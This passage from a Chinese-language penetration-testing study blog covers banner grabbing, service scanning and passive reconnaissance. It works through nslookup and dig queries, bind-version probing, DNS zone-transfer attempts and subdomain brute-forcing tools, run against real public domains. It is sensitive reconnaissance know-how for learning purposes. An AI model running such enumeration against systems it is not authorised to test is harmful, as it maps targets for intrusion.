<li><code>dmitry -p 192.168.153.131</code></li>
<li><code>dmitry -pb 192.168.153.131</code></li>
</ul>
<p><strong>nmap</strong></p>
<p><code>nmap -sT 192.168.153.131 -p 22 --script=banner.nse</code></p>
<p><strong>amap</strong></p>
<ul>
<li><code>amap -B 192.168.153.131 21</code></li>
<li><code>amap -B 192.168.153.131 1-65535</code></li>
<li><code>amap -B  192.168.153.131|grep on</code></li>
</ul>
<p>banner信息抓取能力有限</p>
<p>nmap响应特征分析识别服务</p>
<ul>
<li>发送系列复杂的探测</li>
<li>依据响应特征signature</li>
<li><code>nc  -nv 1.1.1.1 80</code></li>
<li><code>nmap 1.1.1.1 -p 80 -sV</code></li>
</ul>
<h5 id="服务扫描——SNMP"><a href="#服务扫描——SNMP" class="headerlink" title="服务扫描——SNMP"></a>服务扫描——SNMP</h5><ul>
<li><p>简单网络管理协议</p>
</li>
<li><p>Community strings</p>
</li>
<li><p>信息查询或重新配置</p>
<p>识别和绕过防火墙筛选</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>渗透测试学习</tag>
      </tags>
  </entry>
  <entry>
    <title>常见的被动信息收集方式总结</title>
    <url>/2020/03/12/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji/</url>
    <content><![CDATA[<h2 id="渗透测试——-被动信息收集部分"><a href="#渗透测试——-被动信息收集部分" class="headerlink" title="渗透测试—— 被动信息收集部分"></a>渗透测试—— 被动信息收集部分</h2><h2 id="常见的被动信息收集方式总结"><a href="#常见的被动信息收集方式总结" class="headerlink" title="常见的被动信息收集方式总结"></a>常见的被动信息收集方式总结</h2><h5 id="被动信息收集简介"><a href="#被动信息收集简介" class="headerlink" title="被动信息收集简介"></a>被动信息收集简介</h5><ul>
<li>OSINT<ul>
<li>美国军方：<a href="http://www.fas.org/irp/doddir/army/atp2-22-9.pdf" target="_blank" rel="noopener">http://www.fas.org/irp/doddir/army/atp2-22-9.pdf</a></li>
<li>北大西洋公约组织：<a href="http://information-retrieval.info/docs/NATO-OSINT.html" target="_blank" rel="noopener">http://information-retrieval.info/docs/NATO-OSINT.html</a></li>
</ul>
</li>
<li>信息搜集内容<ul>
<li>IP地址段</li>
<li>域名信息</li>
<li>邮件地址</li>
<li>文档内容数据</li>
<li>公司地址</li>
<li>公司组织架构</li>
<li>联系电话/传真号码</li>
<li>人员姓名/职务</li>
<li>目标系统使用的技术架构</li>
<li>公开的商业信息</li>
</ul>
</li>
<li>信息用途<ul>
<li>用信息描述目标</li>
<li>发现</li>
<li>社会工程学攻击</li>
<li>物理缺口</li>
</ul>
</li>
</ul>
<h4 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h4><ol>
<li><p>域名记录</p>
<ol>
<li>A：主机地址(域名 -&gt; IP)</li>
<li>Cname：主机别名记录</li>
<li>NS：域名服务器记录</li>
<li>MX：邮件交换记录</li>
<li>PTR：反向解析（IP -&gt; 域名）</li>
</ol>
</li>
<li><p>DNS查找：</p>
<ol>
<li>浏览器缓存，浏览器会缓存DNS记录一段时间(2-30min)</li>
<li>系统缓存（gethostname）</li>
<li>路由器缓存</li>
<li>如果还是没有，那么就去检查ISP有没有吧</li>
<li>递归搜索</li>
<li>ISP的DNS服务器会从根域名开始进行递归查询</li>
</ol>
</li>
<li><p>递归查询：</p>
<p>主机向本地域名服务器的查询一般都是采用递归查询。</p>
<p>如果主机所询问的本地域名服务器不知道被查询的域名的IP地址，那么本地域名服务器就以DNS客户的身份，向其根域名服务器继续发出查询请求报文(即替主机继续查询)，而不是让主机自己进行下一步查询。因此，递归查询返回的查询结果或者是所要查询的IP地址，或者是返回一个失败的响应，表示无法查询到所需的IP地址。<br><img src="https://i.imgur.com/UBStYKq.jpg" alt="img"></p>
</li>
</ol>
<p>4.迭代查询：</p>
<p>本地域名服务器向根域名服务器的查询通常是采用迭代查询。</p>
<p>当根域名服务器收到本地域名服务器发出的迭代查询请求报文时，要么返回给本地域名服务器所要查询的IP地址，要么返回给本地域名服务器下一步应当查询的域名服务器的IP地址。</p>
<p>5.假设的主机想知道另一个主机（域名为 my.xxsilence.net)的IP地址。具体步骤如下：</p>
<ol>
<li>主机先向其本地域名服务器进行递归查询，如果缓存中没有，继续下一步</li>
<li>本地域名服务器采用迭代查询，先向一个根域名服务器查询。</li>
<li>根域名服务器告诉本地域名服务器，下一次查询的顶级域名服务器 dns.net。</li>
<li>本地域名服务器向顶级域名服务器 dns.net。</li>
<li>顶级域名服务器 dns.net，下一次应查询的权限域名服务器dns.xxsilence.net的IP地址。</li>
<li>本地域名服务器向权限域名服务器dns.xxsilence.net进行查询。</li>
<li>权限域名服务器dns.xxsilence.net告诉本地域名服务器，所查询的主机的IP地址。</li>
<li>本地域名服务器最后把查询结果告诉主机。</li>
</ol>
<h4 id="NSLOOKUP"><a href="#NSLOOKUP" class="headerlink" title="NSLOOKUP"></a>NSLOOKUP</h4><ol>
<li><p>type=a、mx、ns、any</p>
</li>
<li><p>或者使用 q 。（q = type）</p>
</li>
<li><p>组合使用</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nslookup -type=ns example.com <span class="number">156.154</span><span class="number">.70</span><span class="number">.22</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>主机解析 Cname（别名记录）</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nslookup</span></span><br></pre></td></tr></table></figure>

<ul>
<li>只查询 A 记录</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&gt; <span class="builtin-name">set</span> <span class="attribute">type</span>=a</span><br><span class="line">&gt; www.sina.com</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2019041316351316.png" alt="在这里插入图片描述"></p>
<ul>
<li>只查询 mx 记录</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&gt; <span class="builtin-name">set</span> <span class="attribute">type</span>=mx</span><br><span class="line">&gt; sina.com</span><br></pre></td></tr></table></figure>



<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># 查邮件交换服务器的IP地址</span><br><span class="line">&gt; <span class="keyword">set</span> <span class="built_in">type</span>=<span class="keyword">a</span></span><br><span class="line">&gt; freemx1.sinamail.sina.<span class="keyword">com</span>.<span class="keyword">cn</span></span><br><span class="line">&gt; freemx2.sinamail.sina.<span class="keyword">com</span>.<span class="keyword">cn</span></span><br><span class="line">&gt; freemx3.sinamail.sina.<span class="keyword">com</span>.<span class="keyword">cn</span>.</span><br></pre></td></tr></table></figure>

<ul>
<li>查询域名服务器名称</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&gt; <span class="builtin-name">set</span> <span class="attribute">type</span>=ns</span><br><span class="line">&gt; sina.com</span><br></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># 查询域名服务器的IP地址</span><br><span class="line">&gt; <span class="keyword">set</span> <span class="built_in">type</span>=<span class="keyword">a</span></span><br><span class="line">&gt; ns1.sina.<span class="keyword">com</span>.</span><br><span class="line">&gt; ns4.sina.<span class="keyword">com</span>.</span><br><span class="line">&gt; ns3.sina.<span class="keyword">com</span>.<span class="keyword">cn</span>.</span><br><span class="line">&gt; ns4.sina.<span class="keyword">com</span>.<span class="keyword">cn</span>.</span><br><span class="line">&gt; ns1.sina.<span class="keyword">com</span>.<span class="keyword">cn</span>.</span><br></pre></td></tr></table></figure>

<ul>
<li>查询 PTR 记录</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&gt; <span class="builtin-name">set</span> <span class="attribute">type</span>=ptr</span><br><span class="line">&gt; 202.108.3.242</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413163618774.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>查询域名对应的多条 IP 记录<br>&gt; set type=a<br>&gt; <a href="http://mail3-242.sinamail.sina.com.cn/" target="_blank" rel="noopener">mail3-242.sinamail.sina.com.cn</a>.</p>
</li>
<li><p>设置指定域名服务器</p>
</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定域名服务器之后，两次结果不同</span></span><br><span class="line">&gt;<span class="built_in"> server </span>8.8.8.8</span><br><span class="line">&gt; www.sina.com</span><br></pre></td></tr></table></figure>

<ul>
<li>指定 type 为 any</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&gt; <span class="builtin-name">set</span> <span class="attribute">type</span>=any</span><br><span class="line">&gt; sina.com</span><br></pre></td></tr></table></figure>

<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">text</span> = <span class="string">"v=spf1 include:spf.sinamail.sina.com.cn -all"</span></span><br><span class="line"><span class="comment"># spf 记录：反垃圾邮件记录</span></span><br><span class="line"><span class="comment"># 在接收邮件的时候进行反向域名解析，查询比对这个记录，来确认是否是垃圾邮件</span></span><br></pre></td></tr></table></figure>

<ul>
<li>组合使用</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认使用 /etc/resolv.conf 文件的域名服务器</span></span><br><span class="line"><span class="string">root@kali:~#</span> <span class="string">cat</span> <span class="string">/etc/resolv.conf</span> </span><br><span class="line">	<span class="string">domain</span> <span class="string">localdomain</span></span><br><span class="line">	<span class="string">search</span> <span class="string">localdomain</span></span><br><span class="line">	<span class="string">nameserver</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line"><span class="string">root@kali:~#</span> <span class="string">nslookup</span> <span class="string">-q=any</span> <span class="number">163.</span><span class="string">com</span></span><br><span class="line">	<span class="attr">Server:</span>		<span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span></span><br><span class="line">	<span class="attr">Address:</span>	<span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span><span class="comment">#53</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定域名服务器</span></span><br><span class="line"><span class="string">root@kali:~#</span> <span class="string">nslookup</span> <span class="string">-q=any</span> <span class="number">163.</span><span class="string">com</span> <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br></pre></td></tr></table></figure>

<h4 id="被动信息——dig"><a href="#被动信息——dig" class="headerlink" title="被动信息——dig"></a>被动信息——dig</h4><h5 id="1-DIG"><a href="#1-DIG" class="headerlink" title="1.DIG"></a>1.DIG</h5><ul>
<li>dig @8.8.8.8 <a href="http://www.sina.com/" target="_blank" rel="noopener">www.sina.com</a> mx</li>
<li>dig <a href="http://www.sina.com/" target="_blank" rel="noopener">www.sina.com</a> any</li>
<li>反向查询：dig +noall +answer -x 8.8.8.8</li>
<li>bind版本信息： dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</li>
<li>DNS追踪： dig +trace <a href="http://example.com/" target="_blank" rel="noopener">example.com</a></li>
<li>抓包比较递归查询、迭代查询过程的区别</li>
</ul>
<p>1.默认使用 /etc/resplv.conf 指定的域名服务器</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">root@kali:~#</span> <span class="string">nslookup</span> <span class="string">sina.com</span> <span class="string">-type=any</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">	<span class="attr">Server:</span>		<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">	<span class="attr">Address:</span>	<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span><span class="comment">#53</span></span><br><span class="line">	</span><br><span class="line">	<span class="attr">Non-authoritative answer:</span></span><br><span class="line">	<span class="attr">Name:</span>	<span class="string">sina.com</span></span><br><span class="line">	<span class="attr">Address:</span> <span class="number">66.102</span><span class="number">.251</span><span class="number">.33</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#默认使用 /etc/resplv.conf 指定的域名服务器</span></span><br><span class="line"><span class="string">root@kali:~#</span> <span class="string">dig</span> <span class="string">sina.com</span> <span class="string">any</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"># 指定域名服务器</span><br><span class="line"><span class="symbol">root@</span>kali:~# dig sina.com any @<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"># 尝试指定不同的域名服务器</span><br><span class="line"><span class="symbol">root@</span>kali:~# dig sina.com any @<span class="number">202.106</span><span class="number">.2</span><span class="number">.20</span></span><br><span class="line"><span class="symbol">root@</span>kali:~# dig sina.com any @<span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br><span class="line"><span class="symbol">root@</span>kali:~# dig sina.com any @<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br></pre></td></tr></table></figure>

<p>2.迭代别名记录查询</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改默认域名服务器</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /etc/resolv.conf </span></span><br><span class="line">	domain localdomain</span><br><span class="line">	search localdomain</span><br><span class="line">	nameserver <span class="number">114.114</span>.<span class="number">114.114</span></span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dig mail.163.com any</span></span><br></pre></td></tr></table></figure>

<p>3.一些参数</p>
<ul>
<li>+noall：不显示信息</li>
<li>+answer：显示结果</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">root@kali:~# <span class="keyword">dig</span> +noall +answer mail.<span class="number">163</span>.<span class="keyword">com</span> any</span><br><span class="line">mail.<span class="number">163</span>.<span class="keyword">com</span>.		<span class="number">131</span>	IN	CNAME	mail163.ntes53.netease.<span class="keyword">com</span>.</span><br><span class="line">root@kali:~# <span class="keyword">dig</span> +noall +answer mail.<span class="number">163</span>.<span class="keyword">com</span> any | awk <span class="string">'&#123;print $5&#125;'</span></span><br></pre></td></tr></table></figure>

<p>4.反向查询</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dig 163.com</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"># 反向查询 PTR记录</span><br><span class="line"><span class="symbol">root@</span>kali:~# dig -x <span class="number">123.58</span><span class="number">.180</span><span class="number">.8</span></span><br></pre></td></tr></table></figure>

<p>5.查询bind版本信息</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 dig 默认只会查询当前 fqdn 名称，不会查询所有的记录</span></span><br><span class="line"><span class="comment"># dig 可以查询 bind 版本信息，根据 bind 漏洞，就可以全部获取 DNS 服务器权限</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dig sina.com any</span></span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询结果为空（被隐藏）</span></span><br><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># dig +noall +answer txt chaos VERSION.BIND <span class="doctag">@ns</span>2.sina.com.</span></span><br><span class="line">VERSION.BIND.		<span class="number">0</span>	CH	TXT	<span class="string">"  "</span></span><br></pre></td></tr></table></figure>

<p>6.DNS追踪</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 跟踪过程：直接迭代查询，不经过本地缓存域名0服务器（从根域开始）</span></span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dig +trace 163.com</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">抓包比较递归查询、迭代查询过程的区别</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2019041316390245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="2-区域传送"><a href="#2-区域传送" class="headerlink" title="2.区域传送"></a>2.区域传送</h4><p>1.区域传送：在本域的各个域名服务器之间进行信息同步</p>
<p>2.区域传送</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dig <span class="doctag">@ns</span>1.example.com example.com axfr</span></span><br><span class="line"></span><br><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># dig sina.com any</span></span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># dig <span class="doctag">@ns</span>2.sina.com sina.com axfr</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413163913826.png" alt="在这里插入图片描述"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"># host -T -l sina.com <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">root@</span>kali:~# host -T -l sina.com ns2.sina.com.</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413163922940.png" alt="在这里插入图片描述"></p>
<p>3.帮助文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# dig -h</span><br><span class="line">Usage:  dig [@global-server] [domain] [q-type] [q-class] &#123;q-opt&#125;</span><br><span class="line">            &#123;global-d-opt&#125; host [@local-server] &#123;local-d-opt&#125;</span><br><span class="line">            [ host [@local-server] &#123;local-d-opt&#125; [<span class="built_in">..</span>.]]</span><br><span class="line">Where:  domain	  is <span class="keyword">in</span> the Domain Name System</span><br><span class="line">        q-class  is one of (<span class="keyword">in</span>,hs,ch,<span class="built_in">..</span>.) [default: <span class="keyword">in</span>]</span><br><span class="line">        q-type   is one of (a,any,mx,ns,soa,hinfo,axfr,txt,<span class="built_in">..</span>.) [default:a]</span><br><span class="line">                 (Use <span class="attribute">ixfr</span>=version <span class="keyword">for</span><span class="built_in"> type </span>ixfr)</span><br><span class="line">        q-opt    is one of:</span><br><span class="line">                 -4                  (use IPv4 query transport only)</span><br><span class="line">                 -6                  (use<span class="built_in"> IPv6 </span>query transport only)</span><br><span class="line">                 -b address[#port]   (bind <span class="keyword">to</span> source address/port)</span><br><span class="line">                 -c class            (specify query class)</span><br><span class="line">                 -f filename         (batch mode)</span><br><span class="line">                 -i                  (use IP6.INT <span class="keyword">for</span><span class="built_in"> IPv6 </span>reverse lookups)</span><br><span class="line">                 -k keyfile          (specify tsig key file)</span><br><span class="line">                 -m                  (<span class="builtin-name">enable</span> memory usage debugging)</span><br><span class="line">                 -p<span class="built_in"> port </span>            (specify<span class="built_in"> port </span>number)</span><br><span class="line">                 -q name             (specify query name)</span><br><span class="line">                 -t<span class="built_in"> type </span>            (specify query type)</span><br><span class="line">                 -u                  (display times <span class="keyword">in</span> usec instead of msec)</span><br><span class="line">                 -x dot-notation     (shortcut <span class="keyword">for</span> reverse lookups)</span><br><span class="line">                 -y [hmac:]name:key  (specify named base64 tsig key)</span><br><span class="line">        d-opt    is of the form +keyword[=value], where keyword is:</span><br><span class="line">                 +[<span class="literal">no</span>]aaflag         (<span class="builtin-name">Set</span> AA flag <span class="keyword">in</span> query (+[<span class="literal">no</span>]aaflag))</span><br><span class="line">                 +[<span class="literal">no</span>]aaonly         (<span class="builtin-name">Set</span> AA flag <span class="keyword">in</span> query (+[<span class="literal">no</span>]aaflag))</span><br><span class="line">                 +[<span class="literal">no</span>]additional     (Control display of additional section)</span><br><span class="line">                 +[<span class="literal">no</span>]adflag         (<span class="builtin-name">Set</span> AD flag <span class="keyword">in</span> query (default on))</span><br><span class="line">                 +[<span class="literal">no</span>]all            (<span class="builtin-name">Set</span> <span class="keyword">or</span> clear all display flags)</span><br><span class="line">                 +[<span class="literal">no</span>]answer         (Control display of answer section)</span><br><span class="line">                 +[<span class="literal">no</span>]authority      (Control display of authority section)</span><br><span class="line">                 +[<span class="literal">no</span>]badcookie      (Retry BADCOOKIE responses)</span><br><span class="line">                 +[<span class="literal">no</span>]besteffort     (Try <span class="keyword">to</span> parse even illegal messages)</span><br><span class="line">                 +<span class="attribute">bufsize</span>=###        (<span class="builtin-name">Set</span> EDNS0 Max UDP packet size)</span><br><span class="line">                 +[<span class="literal">no</span>]cdflag         (<span class="builtin-name">Set</span> checking disabled flag <span class="keyword">in</span> query)</span><br><span class="line">                 +[<span class="literal">no</span>]class          (Control display of class <span class="keyword">in</span> records)</span><br><span class="line">                 +[<span class="literal">no</span>]cmd            (Control display of command line)</span><br><span class="line">                 +[<span class="literal">no</span>]comments       (Control display of comment lines)</span><br><span class="line">                 +[<span class="literal">no</span>]cookie         (<span class="builtin-name">Add</span> a COOKIE option <span class="keyword">to</span> the request)</span><br><span class="line">                 +[<span class="literal">no</span>]crypto         (Control display of cryptographic fields <span class="keyword">in</span> records)</span><br><span class="line">                 +[<span class="literal">no</span>]defname        (Use search list (+[<span class="literal">no</span>]search))</span><br><span class="line">                 +[<span class="literal">no</span>]dnssec         (Request DNSSEC records)</span><br><span class="line">                 +<span class="attribute">domain</span>=###         (<span class="builtin-name">Set</span><span class="built_in"> default </span>domainname)</span><br><span class="line">                 +[<span class="literal">no</span>]dscp[=###]     (<span class="builtin-name">Set</span> the DSCP value <span class="keyword">to</span> ### [0<span class="built_in">..</span>63])</span><br><span class="line">                 +[<span class="literal">no</span>]edns[=###]     (<span class="builtin-name">Set</span> EDNS version) [0]</span><br><span class="line">                 +<span class="attribute">ednsflags</span>=###      (<span class="builtin-name">Set</span> EDNS flag bits)</span><br><span class="line">                 +[<span class="literal">no</span>]ednsnegotiation (<span class="builtin-name">Set</span> EDNS version negotiation)</span><br><span class="line">                 +<span class="attribute">ednsopt</span>=###[:value] (Send specified EDNS option)</span><br><span class="line">                 +noednsopt          (Clear list of +ednsopt options)</span><br><span class="line">                 +[<span class="literal">no</span>]expire         (Request time <span class="keyword">to</span> expire)</span><br><span class="line">                 +[<span class="literal">no</span>]fail           (Don<span class="string">'t try next server on SERVFAIL)</span></span><br><span class="line"><span class="string">                 +[no]header-only    (Send query without a question section)</span></span><br><span class="line"><span class="string">                 +[no]identify       (ID responders in short answers)</span></span><br><span class="line"><span class="string">                 +[no]idnout         (convert IDN response)</span></span><br><span class="line"><span class="string">                 +[no]ignore         (Don'</span>t revert <span class="keyword">to</span> TCP <span class="keyword">for</span> TC responses.)</span><br><span class="line">                 +[<span class="literal">no</span>]keepopen       (Keep the TCP socket open between queries)</span><br><span class="line">                 +[<span class="literal">no</span>]mapped         (Allow mapped IPv4 over IPv6)</span><br><span class="line">                 +[<span class="literal">no</span>]multiline      (<span class="builtin-name">Print</span> records <span class="keyword">in</span> an expanded format)</span><br><span class="line">                 +<span class="attribute">ndots</span>=###          (<span class="builtin-name">Set</span> search NDOTS value)</span><br><span class="line">                 +[<span class="literal">no</span>]nsid           (Request Name<span class="built_in"> Server </span>ID)</span><br><span class="line">                 +[<span class="literal">no</span>]nssearch       (Search all authoritative nameservers)</span><br><span class="line">                 +[<span class="literal">no</span>]onesoa         (AXFR prints only one soa record)</span><br><span class="line">                 +[<span class="literal">no</span>]<span class="attribute">opcode</span>=###     (<span class="builtin-name">Set</span> the opcode of the request)</span><br><span class="line">                 +[<span class="literal">no</span>]qr             (<span class="builtin-name">Print</span> question before sending)</span><br><span class="line">                 +[<span class="literal">no</span>]question       (Control display of question section)</span><br><span class="line">                 +[<span class="literal">no</span>]rdflag         (Recursive mode (+[<span class="literal">no</span>]recurse))</span><br><span class="line">                 +[<span class="literal">no</span>]recurse        (Recursive mode (+[<span class="literal">no</span>]rdflag))</span><br><span class="line">                 +<span class="attribute">retry</span>=###          (<span class="builtin-name">Set</span> number of UDP retries) [2]</span><br><span class="line">                 +[<span class="literal">no</span>]rrcomments     (Control display of per-record comments)</span><br><span class="line">                 +[<span class="literal">no</span>]search         (<span class="builtin-name">Set</span> whether <span class="keyword">to</span> use searchlist)</span><br><span class="line">                 +[<span class="literal">no</span>]short          (Display <span class="literal">nothing</span> except short</span><br><span class="line">                                      form of answer)</span><br><span class="line">                 +[<span class="literal">no</span>]showsearch     (Search with intermediate results)</span><br><span class="line">                 +[<span class="literal">no</span>]sigchase       (Chase DNSSEC signatures)</span><br><span class="line">                 +[<span class="literal">no</span>]<span class="attribute">split</span>=##       (Split hex/base64 fields into chunks)</span><br><span class="line">                 +[<span class="literal">no</span>]stats          (Control display of statistics)</span><br><span class="line">                 +<span class="attribute">subnet</span>=addr        (<span class="builtin-name">Set</span> edns-client-subnet option)</span><br><span class="line">                 +[<span class="literal">no</span>]tcp            (TCP mode (+[<span class="literal">no</span>]vc))</span><br><span class="line">                 +<span class="attribute">timeout</span>=###        (<span class="builtin-name">Set</span> query timeout) [5]</span><br><span class="line">                 +[<span class="literal">no</span>]topdown        (<span class="keyword">Do</span> +sigchase <span class="keyword">in</span> top-down mode)</span><br><span class="line">                 +[<span class="literal">no</span>]trace          (Trace delegation down <span class="keyword">from</span> root [+dnssec])</span><br><span class="line">                 +<span class="attribute">trusted-key</span>=####   (Trusted Key <span class="keyword">to</span> use with +sigchase)</span><br><span class="line">                 +<span class="attribute">tries</span>=###          (<span class="builtin-name">Set</span> number of UDP attempts) [3]</span><br><span class="line">                 +[<span class="literal">no</span>]ttlid          (Control display of ttls <span class="keyword">in</span> records)</span><br><span class="line">                 +[<span class="literal">no</span>]ttlunits       (Display TTLs <span class="keyword">in</span> human-readable units)</span><br><span class="line">                 +[<span class="literal">no</span>]unknownformat  (<span class="builtin-name">Print</span> RDATA <span class="keyword">in</span> RFC 3597 <span class="string">"unknown"</span> format)</span><br><span class="line">                 +[<span class="literal">no</span>]vc             (TCP mode (+[<span class="literal">no</span>]tcp))</span><br><span class="line">                 +[<span class="literal">no</span>]zflag          (<span class="builtin-name">Set</span> Z flag <span class="keyword">in</span> query)</span><br><span class="line">        global d-opts <span class="keyword">and</span> servers (before host name) affect all queries.</span><br><span class="line">        local d-opts <span class="keyword">and</span> servers (after host name) affect only that lookup.</span><br><span class="line">        -h                           (<span class="builtin-name">print</span> help <span class="keyword">and</span> exit)</span><br><span class="line">        -v                           (<span class="builtin-name">print</span> version <span class="keyword">and</span> exit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~# host -h</span><br><span class="line">host: illegal option -- h</span><br><span class="line">Usage: host [-aCdilrTvVw] [-c class] [-N ndots] [-t type] [-W time]</span><br><span class="line">    [-R number] [-m flag] hostname [server]</span><br><span class="line">   -a is equivalent <span class="keyword">to</span> -v -t ANY</span><br><span class="line">   -c specifies query class <span class="keyword">for</span> non-IN data</span><br><span class="line">   -C compares SOA records on authoritative nameservers</span><br><span class="line">   -d is equivalent <span class="keyword">to</span> -v</span><br><span class="line">   -i IP6.INT reverse lookups</span><br><span class="line">   -l lists all hosts <span class="keyword">in</span> a domain, using AXFR</span><br><span class="line">   -m <span class="builtin-name">set</span> memory debugging flag (trace|record|usage)</span><br><span class="line">   -N changes the number of dots allowed before root lookup is done</span><br><span class="line">   -r disables recursive processing</span><br><span class="line">   -R specifies number of retries <span class="keyword">for</span> UDP packets</span><br><span class="line">   -s a SERVFAIL response should stop query</span><br><span class="line">   -t specifies the query type</span><br><span class="line">   -T enables TCP<span class="built_in">/IP </span>mode</span><br><span class="line">   -v enables verbose output</span><br><span class="line">   -V <span class="builtin-name">print</span> version number <span class="keyword">and</span> exit</span><br><span class="line">   -w specifies <span class="keyword">to</span> wait forever <span class="keyword">for</span> a reply</span><br><span class="line">   -W specifies how long <span class="keyword">to</span> wait <span class="keyword">for</span> a reply</span><br><span class="line">   -4 use IPv4 query transport only</span><br><span class="line">   -6 use<span class="built_in"> IPv6 </span>query transport only</span><br></pre></td></tr></table></figure>

<h4 id="被动信息收集-DNS字典爆破"><a href="#被动信息收集-DNS字典爆破" class="headerlink" title="被动信息收集-DNS字典爆破"></a>被动信息收集-DNS字典爆破</h4><h5 id="1-DNS字典简介"><a href="#1-DNS字典简介" class="headerlink" title="1.DNS字典简介"></a>1.DNS字典简介</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">fierce</span> <span class="selector-tag">-dnsserver</span> 8<span class="selector-class">.8</span><span class="selector-class">.8</span><span class="selector-class">.8</span> <span class="selector-tag">-dns</span> <span class="selector-tag">sina</span><span class="selector-class">.com</span><span class="selector-class">.cn</span> <span class="selector-tag">-wordlist</span> <span class="selector-tag">a</span><span class="selector-class">.txt</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">dnsenum</span> <span class="selector-tag">-f</span> <span class="selector-tag">dnsbig</span><span class="selector-class">.txt</span> <span class="selector-tag">-dnsserver</span> 8<span class="selector-class">.8</span><span class="selector-class">.8</span><span class="selector-class">.8</span> <span class="selector-tag">sina</span><span class="selector-class">.com</span> <span class="selector-tag">-o</span> <span class="selector-tag">sina</span><span class="selector-class">.xml</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">dnsmap</span> <span class="selector-tag">sina</span><span class="selector-class">.com</span> <span class="selector-tag">-w</span> <span class="selector-tag">dns</span><span class="selector-class">.txt</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">dnsrecon</span> <span class="selector-tag">-d</span> <span class="selector-tag">sina</span><span class="selector-class">.com</span> <span class="selector-tag">--lifetime</span> 10 <span class="selector-tag">-t</span> <span 